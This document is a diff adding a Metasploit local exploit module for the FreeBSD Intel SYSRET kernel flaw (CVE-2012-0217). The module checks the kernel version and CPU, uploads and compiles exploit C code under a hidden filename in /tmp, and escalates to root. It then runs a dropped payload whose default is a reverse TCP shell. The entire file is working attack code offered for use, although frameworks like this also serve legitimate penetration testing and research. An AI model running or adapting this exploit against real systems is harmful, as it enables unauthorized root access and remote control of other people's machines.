@@ -1,0 +1,181 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = GreatRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'FreeBSD Intel SYSRET Privilege Escalation',
+      'Description'    => %q{
+        This module exploits a vulnerability in the FreeBSD kernel,
+        when running on 64-bit Intel processors.
+
+        By design, 64-bit processors following the X86-64 specification will
+        trigger a general protection fault (GPF) when executing a SYSRET
+        instruction with a non-canonical address in the RCX register.
+
+        However, Intel processors check for a non-canonical address prior to
+        dropping privileges, causing a GPF in privileged mode. As a result,
+        the current userland RSP stack pointer is restored and executed,
+        resulting in privileged code execution.
+
+        This module has been tested successfully on:
+
+        FreeBSD 8.3-RELEASE (amd64); and
+        FreeBSD 9.0-RELEASE (amd64).
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Rafal Wojtczuk',  # Discovery
+          'John Baldwin',    # Discovery
+          'iZsh',            # Exploit
+          'bcoles'           # Metasploit
+        ],
+      'DisclosureDate' => '2012-06-12',
+      'Platform'       => ['bsd'],
+      'Arch'           => [ARCH_X64],
+      'SessionTypes'   => ['shell'],
+      'References'     =>
+        [
+          ['BID', '53856'],
+          ['CVE', '2012-0217'],
+          ['EDB', '28718'],
+          ['PACKETSTORM', '113584'],
+          ['URL', 'https://www.freebsd.org/security/patches/SA-12:04/sysret.patch'],
+          ['URL', 'https://blog.xenproject.org/2012/06/13/the-intel-sysret-privilege-escalation/'],
+          ['URL', 'https://github.com/iZsh/exploits/blob/master/stash/CVE-2012-0217-sysret/CVE-2012-0217-sysret_FreeBSD.c'],
+          ['URL', 'https://fail0verflow.com/blog/2012/cve-2012-0217-intel-sysret-freebsd/'],
+          ['URL', 'http://security.freebsd.org/advisories/FreeBSD-SA-12:04.sysret.asc'],
+          ['URL', 'https://www.slideshare.net/nkslides/exploiting-the-linux-kernel-via-intels-sysret-implementation']
+        ],
+      'Targets'        =>
+        [
+          ['Automatic', {}]
+        ],
+      'DefaultOptions' => { 'PAYLOAD' => 'bsd/x64/shell_reverse_tcp' },
+      'DefaultTarget'  => 0))
+    register_advanced_options [
+      OptBool.new('ForceExploit', [false, 'Override check result', false]),
+      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
+    ]
+  end
+
+  def base_dir
+    datastore['WritableDir'].to_s
+  end
+
+  def upload(path, data)
+    print_status "Writing '#{path}' (#{data.size} bytes) ..."
+    rm_f path
+    write_file path, data
+    register_file_for_cleanup path
+  end
+
+  def upload_and_chmodx(path, data)
+    upload path, data
+    cmd_exec "chmod +x '#{path}'"
+  end
+
+  def upload_and_compile(path, data, gcc_args='')
+    upload "#{path}.c", data
+
+    gcc_cmd = "gcc -o #{path} #{path}.c"
+    if session.type.eql? 'shell'
+      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
+    end
+    output = cmd_exec gcc_cmd
+
+    unless output.blank?
+      print_error output
+      fail_with Failure::Unknown, "#{path}.c failed to compile"
+    end
+
+    register_file_for_cleanup path
+    chmod path
+  end
+
+  def exploit_data(file)
+    ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2012-0217', file)
+  end
+
+  def is_root?
+    (cmd_exec('id -u').to_s.gsub(/[^\d]/, '') == '0')
+  end
+
+  def strip_comments(c_code)
+    c_code.gsub(%r{/\*.*?\*/}m, '').gsub(%r{^\s*//.*$}, '')
+  end
+
+  def check
+    kernel_release = cmd_exec('uname -r').to_s
+    unless kernel_release =~ /^(8\.3|9\.0)-RELEASE/
+      vprint_error "FreeBSD version #{kernel_release} is not vulnerable"
+      return Exploit::CheckCode::Safe
+    end
+    vprint_good "FreeBSD version #{kernel_release} appears vulnerable"
+
+    arch = cmd_exec('uname -m').to_s
+    unless arch.include? '64'
+      vprint_error "System architecture #{arch} is not supported"
+      return CheckCode::Safe
+    end
+    vprint_good "System architecture #{arch} is supported"
+
+    hw_model = cmd_exec('/sbin/sysctl hw.model').to_s
+    unless hw_model.downcase.include? 'intel'
+      vprint_error "#{hw_model} is not vulnerable"
+      return CheckCode::Safe
+    end
+    vprint_good "#{hw_model} is vulnerable"
+
+    CheckCode::Appears
+  end
+
+  def exploit
+    unless check == CheckCode::Appears
+      unless datastore['ForceExploit']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      end
+      print_warning 'Target does not appear to be vulnerable'
+    end
+
+    if is_root?
+      unless datastore['ForceExploit']
+        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'
+      end
+    end
+
+    unless writable? base_dir
+      fail_with Failure::BadConfig, "#{base_dir} is not writable"
+    end
+
+    # Upload and compile exploit executable
+    executable_name = ".#{rand_text_alphanumeric 5..10}"
+    executable_path = "#{base_dir}/#{executable_name}"
+    upload_and_compile executable_path, strip_comments(exploit_data('sysret.c')), '-Wall'
+
+    # Upload payload executable
+    payload_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}"
+    upload_and_chmodx payload_path, generate_payload_exe
+
+    # Launch exploit
+    print_status 'Launching exploit...'
+    output = cmd_exec executable_path
+    output.each_line { |line| vprint_status line.chomp }
+
+    unless is_root?
+      fail_with Failure::Unknown, 'Exploitation failed'
+    end
+    print_good "Success! Executing payload..."
+
+    cmd_exec payload_path
+  end
+end
